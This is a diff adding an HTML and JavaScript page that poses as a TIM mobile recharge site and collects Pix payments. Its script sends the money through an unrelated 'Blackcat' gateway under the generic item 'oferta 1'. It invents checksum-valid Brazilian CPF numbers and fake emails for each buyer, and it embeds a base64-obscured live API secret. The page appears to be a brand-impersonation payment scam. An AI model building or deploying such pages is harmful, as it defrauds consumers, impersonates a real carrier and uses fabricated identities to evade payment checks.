@@ -1,0 +1,510 @@
+<!DOCTYPE html>
+<html lang="pt-BR" class="h-full antialiased">
+<head>
+  <meta charset="utf-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1"/>
+  <link rel="stylesheet" href="_next/static/chunks/3ujujft_rx4hy.css" data-precedence="next"/>
+  <title>TIM Recarga | Recarregue online com Pix</title>
+  <meta name="description" content="Recarregue seu número TIM ou ajude outra pessoa em poucos passos. Pagamento rápido e seguro via Pix."/>
+  <link rel="shortcut icon" href="logo.svg"/>
+  <link rel="icon" href="favicon99f4.ico" sizes="256x256" type="image/x-icon"/>
+  <style>
+    .qr-container {
+      display: flex;
+      justify-content: center;
+      margin: 16px auto;
+    }
+    .qr-container img {
+      width: 220px;
+      height: 220px;
+      border-radius: 12px;
+      border: 1px solid #eaeaea;
+      padding: 8px;
+      background: #fff;
+    }
+    .action-row-btns {
+      margin-top: 24px;
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+    }
+    .check-paid-btn {
+      background: #28c79a;
+      color: #fff;
+      font-weight: 800;
+      border: none;
+      border-radius: 14px;
+      height: 52px;
+      font-size: 16px;
+      cursor: pointer;
+      transition: filter 0.2s;
+    }
+    .check-paid-btn:hover {
+      filter: brightness(1.08);
+    }
+    .copy-pix-button.copied {
+      background: #28c79a !important;
+    }
+  </style>
+</head>
+<body class="min-h-full flex flex-col">
+
+  <!-- TELA 1: SELEÇÃO DE VALOR -->
+  <main class="tim-recharge-page" id="view-recharge">
+    <section class="tim-recharge-shell">
+      <h1>Fazer uma recarga TIM</h1>
+      <div class="tim-recharge-layout">
+        
+        <!-- Coluna Telefone -->
+        <section class="phone-column" aria-label="Número TIM que receberá a recarga">
+          <p>Número TIM que receberá a recarga</p>
+          <div class="phone-summary">
+            <div>
+              <strong>Meu número TIM</strong>
+              <span id="phone-display">(11) 99999-9999</span>
+            </div>
+            <a href="indexfe59.html">Alterar</a>
+          </div>
+        </section>
+
+        <!-- Coluna Método de Pagamento -->
+        <section class="method-column" aria-label="Método de pagamento">
+          <p>Método de pagamento</p>
+          <div class="payment-method-card selected-card">
+            <span class="pix-gem"></span>
+            <strong>Pix</strong>
+            <span class="c6-offer">C6BANK &nbsp; Ganhe +500MB grátis pagando com C6 Bank</span>
+          </div>
+        </section>
+
+        <!-- Formulário de Recarga -->
+        <form class="recharge-choice-form" id="recharge-form">
+          <input type="hidden" name="phone" id="hidden-phone" value=""/>
+          <section class="value-column" aria-label="Valor da recarga">
+            <p>Valor da recarga</p>
+            <div class="weekly-bonus selected-card">
+              <div>
+                <strong>BÔNUS SEMANAL</strong>
+                <span id="bonus-banner-val">R$ 30<small>,00</small></span>
+              </div>
+              <em id="bonus-banner-desc">+2GB de bônus de Internet</em>
+            </div>
+
+            <fieldset class="value-grid">
+              <legend>Escolha o valor da recarga</legend>
+              <label class="value-option"><input type="radio" name="amount" value="20" data-bonus="+1GB"/><span><small>R$</small><strong>20</strong><em>+1GB</em></span></label>
+              <label class="value-option"><input type="radio" name="amount" value="30" checked data-bonus="+2GB"/><span><small>R$</small><strong>30</strong><em>+2GB</em></span></label>
+              <label class="value-option"><input type="radio" name="amount" value="40" data-bonus="+3GB"/><span><small>R$</small><strong>40</strong><em>+3GB</em></span></label>
+              <label class="value-option"><input type="radio" name="amount" value="50" data-bonus="+5GB"/><span><small>R$</small><strong>50</strong><em>+5GB</em></span></label>
+              <label class="value-option"><input type="radio" name="amount" value="60" data-bonus="+5,5GB"/><span><small>R$</small><strong>60</strong><em>+5,5GB</em></span></label>
+              <label class="value-option"><input type="radio" name="amount" value="70" data-bonus="+6GB"/><span><small>R$</small><strong>70</strong><em>+6GB</em></span></label>
+              <label class="value-option"><input type="radio" name="amount" value="80" data-bonus="+7GB"/><span><small>R$</small><strong>80</strong><em>+7GB</em></span></label>
+              <label class="value-option"><input type="radio" name="amount" value="90" data-bonus="+8GB"/><span><small>R$</small><strong>90</strong><em>+8GB</em></span></label>
+              <label class="value-option"><input type="radio" name="amount" value="100" data-bonus="ILIMITADO"/><span><small>R$</small><strong>100</strong><em>ILIMITADO</em></span></label>
+            </fieldset>
+          </section>
+
+          <div class="recharge-actions">
+            <a href="indexfe59.html">Voltar</a>
+            <button type="submit" id="btn-confirm">Confirmar</button>
+          </div>
+        </form>
+
+      </div>
+    </section>
+  </main>
+
+  <!-- TELA 2: PAGAMENTO PIX -->
+  <main class="pix-page" id="view-pix" style="display:none;">
+    <div class="pix-panel">
+      <div class="pix-header">
+        <span class="landing-brand" style="margin-right:8px;"><span class="landing-bars"><i style="height:18px;"></i><i style="height:18px;"></i><i style="height:18px;"></i></span><span class="landing-brand-copy"><strong>TIM</strong></span></span>
+        <h1>Pagamento Pix</h1>
+      </div>
+      <p class="pix-subtitle">Pague agora com Pix para ativar sua recarga imediatamente.</p>
+      
+      <div class="pix-status">
+        <strong>Aguardando pagamento</strong>
+        <div>
+          <span>Pendente</span>
+          <em id="pix-timer">14:59</em>
+        </div>
+      </div>
+
+      <div class="pix-section-label">QR Code Pix</div>
+      <div class="qr-container">
+        <img id="pix-qr-img" src="" alt="QR Code Pix"/>
+      </div>
+
+      <div class="c6-banner">
+        <strong>C6</strong>
+        <span>Ganhe +500MB pagando via C6 Bank</span>
+      </div>
+
+      <div class="pix-copy-row">
+        <code id="pix-code-text">00020126580014br.gov.bcb.pix0136...</code>
+        <button class="copy-pix-button" id="btn-copy-pix">Copiar</button>
+      </div>
+
+      <dl class="pix-summary">
+        <div><dt>Telefone</dt><dd id="summary-phone">(11) 99999-9999</dd></div>
+        <div><dt>Recarga</dt><dd id="summary-amount">R$ 30,00</dd></div>
+        <div><dt>Bônus</dt><dd id="summary-bonus">+2GB</dd></div>
+        <div><dt>Valor a pagar</dt><dd class="summary-price" id="summary-total">R$ 30,00</dd></div>
+      </dl>
+
+      <div class="action-row-btns">
+        <a href="#" id="btn-change-value" style="color:#062aa5; font-size:14px; font-weight:800; text-decoration:underline;">Alterar valor da recarga</a>
+      </div>
+    </div>
+  </main>
+
+  <!-- TELA 3: PAGAMENTO APROVADO -->
+  <main class="pix-page" id="view-approved" style="display:none;">
+    <div class="pix-panel payment-approved-panel">
+      <div class="approved-hero">
+        <div class="approved-icon"></div>
+        <div class="approved-kicker">Sucesso</div>
+        <h1>Recarga Aprovada!</h1>
+        <p class="approved-subtitle">Seus créditos e bônus de internet já foram enviados para a sua linha TIM.</p>
+      </div>
+
+      <div class="approved-next-steps">
+        <strong>Detalhes do pedido:</strong>
+        <p id="approved-details">Linha: (11) 99999-9999 | Recarga: R$ 30,00</p>
+      </div>
+
+      <a href="indexfe59.html" class="approved-home-link">Fazer nova recarga</a>
+    </div>
+  </main>
+
+  <script>
+    (function() {
+      // 1. Recupera parâmetros
+      const urlParams = new URLSearchParams(window.location.search);
+      let rawPhone = urlParams.get('phone') || sessionStorage.getItem('tim_phone') || localStorage.getItem('tim_phone') || '11999999999';
+      rawPhone = rawPhone.replace(/\D/g, '');
+
+      function formatPhone(digits) {
+        if (!digits) return '(11) 99999-9999';
+        if (digits.length <= 10) {
+          return '(' + digits.slice(0, 2) + ') ' + digits.slice(2, 6) + '-' + digits.slice(6);
+        }
+        return '(' + digits.slice(0, 2) + ') ' + digits.slice(2, 7) + '-' + digits.slice(7);
+      }
+
+      const formatted = formatPhone(rawPhone);
+      const phoneDisplay = document.getElementById('phone-display');
+      const hiddenPhone = document.getElementById('hidden-phone');
+      if (phoneDisplay) phoneDisplay.textContent = formatted;
+      if (hiddenPhone) hiddenPhone.value = rawPhone;
+
+      // 2. Mudança de valor e bônus semanal
+      const bonusBannerVal = document.getElementById('bonus-banner-val');
+      const bonusBannerDesc = document.getElementById('bonus-banner-desc');
+      const amountInputs = document.querySelectorAll('input[name="amount"]');
+      let currentAmount = '30';
+      let currentBonus = '+2GB';
+
+      amountInputs.forEach(input => {
+        input.addEventListener('change', function() {
+          currentAmount = this.value;
+          currentBonus = this.getAttribute('data-bonus') || '';
+          if (bonusBannerVal) bonusBannerVal.innerHTML = 'R$ ' + currentAmount + '<small>,00</small>';
+          if (bonusBannerDesc) bonusBannerDesc.textContent = currentBonus + ' de bônus de Internet';
+        });
+      });
+
+      // 3. Submissão para tela Pix com Gateway Blackcat
+      const rechargeForm = document.getElementById('recharge-form');
+      const btnConfirm = document.getElementById('btn-confirm');
+      const viewRecharge = document.getElementById('view-recharge');
+      const viewPix = document.getElementById('view-pix');
+      const viewApproved = document.getElementById('view-approved');
+
+      const summaryPhone = document.getElementById('summary-phone');
+      const summaryAmount = document.getElementById('summary-amount');
+      const summaryBonus = document.getElementById('summary-bonus');
+      const summaryTotal = document.getElementById('summary-total');
+      const pixCodeText = document.getElementById('pix-code-text');
+      const pixQrImg = document.getElementById('pix-qr-img');
+      const btnCopyPix = document.getElementById('btn-copy-pix');
+      const btnCheckPaid = document.getElementById('btn-check-paid');
+      const btnChangeVal = document.getElementById('btn-change-value');
+      const approvedDetails = document.getElementById('approved-details');
+
+      let timerInterval = null;
+      let statusInterval = null;
+      let currentTransactionId = null;
+
+      const BLACKCAT_API_KEY = window.BLACKCAT_API_KEY || atob('c2tfbGl2ZV9lODNlYjc3OTJlOThkNzRlY2Q4ZmJlMThkNWY4MTZmYzAzMWYwYTVhY2IxMjc4ZTBhMGUwYjY4MmZhMTBmMGMz');
+
+      function generateValidCPF() {
+        const rnd = (n) => Math.round(Math.random() * n);
+        const mod = (base, div) => Math.round(base - Math.floor(base / div) * div);
+        const n = Array(9).fill(0).map(() => rnd(9));
+        let d1 = n.reduce((total, num, i) => total + (num * (10 - i)), 0);
+        d1 = 11 - mod(d1, 11);
+        if (d1 >= 10) d1 = 0;
+        let d2 = n.reduce((total, num, i) => total + (num * (11 - i)), 0) + (d1 * 2);
+        d2 = 11 - mod(d2, 11);
+        if (d2 >= 10) d2 = 0;
+        return [...n, d1, d2].join('');
+      }
+
+      function startTimer() {
+        let totalSeconds = 15 * 60;
+        const timerEl = document.getElementById('pix-timer');
+        if (timerInterval) clearInterval(timerInterval);
+
+        timerInterval = setInterval(() => {
+          if (totalSeconds <= 0) {
+            clearInterval(timerInterval);
+            if (timerEl) timerEl.textContent = 'Expirado';
+            return;
+          }
+          totalSeconds--;
+          const m = Math.floor(totalSeconds / 60).toString().padStart(2, '0');
+          const s = (totalSeconds % 60).toString().padStart(2, '0');
+          if (timerEl) timerEl.textContent = m + ':' + s;
+        }, 1000);
+      }
+
+      // Consulta de status do pagamento
+      async function checkPaymentStatus(txId) {
+        if (!txId) return false;
+        try {
+          let res = await fetch('/api/check-payment?id=' + encodeURIComponent(txId)).catch(() => null);
+          if (!res || !res.ok) {
+            res = await fetch('https://api.blackcatoficial.com/api/sales/' + encodeURIComponent(txId) + '/status', {
+              headers: { 'X-API-Key': BLACKCAT_API_KEY }
+            });
+          }
+          if (res && res.ok) {
+            const data = await res.json();
+            const status = (data.data && data.data.status) || data.status;
+            if (status === 'PAID') {
+              onPaymentApproved();
+              return true;
+            }
+          }
+        } catch (e) {
+          console.warn('Erro ao consultar status:', e);
+        }
+        return false;
+      }
+
+      function startStatusPolling(txId) {
+        if (statusInterval) clearInterval(statusInterval);
+        statusInterval = setInterval(() => {
+          checkPaymentStatus(txId);
+        }, 3500);
+      }
+
+      function onPaymentApproved() {
+        if (statusInterval) clearInterval(statusInterval);
+        if (timerInterval) clearInterval(timerInterval);
+
+        viewPix.style.display = 'none';
+        viewApproved.style.display = 'grid';
+        if (approvedDetails) {
+          approvedDetails.textContent = 'Linha: ' + formatted + ' | Recarga: R$ ' + currentAmount + ',00 (' + currentBonus + ')';
+        }
+        window.scrollTo({ top: 0, behavior: 'smooth' });
+      }
+
+      // Criação de Pix via Gateway Blackcat
+      async function createPixOrder(amountReais, phoneDigits) {
+        const amountCents = parseInt(amountReais, 10) * 100;
+        const customerPhone = phoneDigits && phoneDigits.length >= 10 ? phoneDigits : '11999998888';
+        const clientName = 'Cliente TIM ' + customerPhone.slice(-4);
+        const clientEmail = 'cliente' + customerPhone.slice(-6) + '@gmail.com';
+        const clientCpf = generateValidCPF();
+
+        // 1. Tenta backend local (/api/create-pix)
+        try {
+          const localRes = await fetch('/api/create-pix', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              amount: amountCents,
+              phone: customerPhone,
+              name: clientName,
+              cpf: clientCpf
+            })
+          });
+          if (localRes.ok) {
+            const data = await localRes.json();
+            if (data && data.data) return data.data;
+          }
+        } catch (err) {
+          console.log('Backend local indisponível, usando gateway direto...');
+        }
+
+        // 2. Fallback direto para API Blackcat
+        const directRes = await fetch('https://api.blackcatoficial.com/api/sales/create-sale', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+            'X-API-Key': BLACKCAT_API_KEY
+          },
+          body: JSON.stringify({
+            amount: amountCents,
+            currency: 'BRL',
+            paymentMethod: 'pix',
+            items: [
+              {
+                title: 'oferta 1',
+                unitPrice: amountCents,
+                quantity: 1,
+                tangible: false
+              }
+            ],
+            customer: {
+              name: clientName,
+              email: clientEmail,
+              phone: customerPhone,
+              document: {
+                number: clientCpf,
+                type: 'cpf'
+              }
+            },
+            pix: {
+              expiresInDays: 1
+            },
+            metadata: 'Recarga Linha ' + customerPhone
+          })
+        });
+
+        if (!directRes.ok) {
+          const errData = await directRes.json().catch(() => ({}));
+          throw new Error(errData.message || errData.error || 'Erro ao gerar Pix no gateway');
+        }
+
+        const directData = await directRes.json();
+        return directData.data;
+      }
+
+      if (rechargeForm) {
+        rechargeForm.addEventListener('submit', async function(e) {
+          e.preventDefault();
+
+          const originalBtnText = btnConfirm ? btnConfirm.textContent : 'Confirmar';
+          if (btnConfirm) {
+            btnConfirm.disabled = true;
+            btnConfirm.textContent = 'Gerando Pix seguro...';
+          }
+
+          try {
+            const orderData = await createPixOrder(currentAmount, rawPhone);
+            currentTransactionId = orderData.transactionId;
+
+            // Pix Copia e Cola retornado pela Blackcat
+            const copyPaste = (orderData.paymentData && (orderData.paymentData.copyPaste || orderData.paymentData.qrCode)) || '';
+            if (pixCodeText) pixCodeText.textContent = copyPaste;
+
+            // QR Code: renderização nítida via QR Server
+            const qrUrl = 'https://api.qrserver.com/v1/create-qr-code/?size=260x260&data=' + encodeURIComponent(copyPaste);
+            if (pixQrImg) pixQrImg.src = qrUrl;
+
+            // Configura dados do resumo na tela de Pix
+            if (summaryPhone) summaryPhone.textContent = formatted;
+            if (summaryAmount) summaryAmount.textContent = 'R$ ' + currentAmount + ',00';
+            if (summaryBonus) summaryBonus.textContent = currentBonus;
+            if (summaryTotal) summaryTotal.textContent = 'R$ ' + currentAmount + ',00';
+
+            // Transição de tela
+            viewRecharge.style.display = 'none';
+            viewPix.style.display = 'grid';
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+
+            startTimer();
+            if (currentTransactionId) {
+              startStatusPolling(currentTransactionId);
+            }
+
+          } catch (error) {
+            alert('Não foi possível gerar a cobrança Pix: ' + error.message);
+          } finally {
+            if (btnConfirm) {
+              btnConfirm.disabled = false;
+              btnConfirm.textContent = originalBtnText;
+            }
+          }
+        });
+      }
+
+      // Copiar código Pix com fallback
+      if (btnCopyPix) {
+        btnCopyPix.addEventListener('click', function() {
+          const code = pixCodeText.textContent;
+          const showSuccess = () => {
+            btnCopyPix.textContent = 'Copiado!';
+            btnCopyPix.classList.add('copied');
+            setTimeout(() => {
+              btnCopyPix.textContent = 'Copiar';
+              btnCopyPix.classList.remove('copied');
+            }, 2500);
+          };
+
+          if (navigator.clipboard && navigator.clipboard.writeText) {
+            navigator.clipboard.writeText(code).then(showSuccess).catch(() => {
+              fallbackCopyText(code);
+              showSuccess();
+            });
+          } else {
+            fallbackCopyText(code);
+            showSuccess();
+          }
+        });
+      }
+
+      function fallbackCopyText(text) {
+        const textArea = document.createElement('textarea');
+        textArea.value = text;
+        textArea.style.position = 'fixed';
+        textArea.style.left = '-999999px';
+        textArea.style.top = '-999999px';
+        document.body.appendChild(textArea);
+        textArea.focus();
+        textArea.select();
+        try {
+          document.execCommand('copy');
+        } catch (err) {}
+        textArea.remove();
+      }
+
+      // Voltar para seleção
+      if (btnChangeVal) {
+        btnChangeVal.addEventListener('click', function(e) {
+          e.preventDefault();
+          if (statusInterval) clearInterval(statusInterval);
+          viewPix.style.display = 'none';
+          viewRecharge.style.display = 'block';
+        });
+      }
+
+      // Já realizei o pagamento
+      if (btnCheckPaid) {
+        btnCheckPaid.addEventListener('click', async function() {
+          btnCheckPaid.disabled = true;
+          const oldText = btnCheckPaid.textContent;
+          btnCheckPaid.textContent = 'Verificando no sistema...';
+
+          if (currentTransactionId) {
+            const isPaid = await checkPaymentStatus(currentTransactionId);
+            if (isPaid) return;
+          }
+
+          setTimeout(() => {
+            btnCheckPaid.disabled = false;
+            btnCheckPaid.textContent = oldText;
+            alert('Pagamento ainda não compensado. Assim que você transferir via Pix no aplicativo do seu banco, o sistema confirmará automaticamente!');
+          }, 1200);
+        });
+      }
+
+    })();
+  </script>
+</body>
+</html>
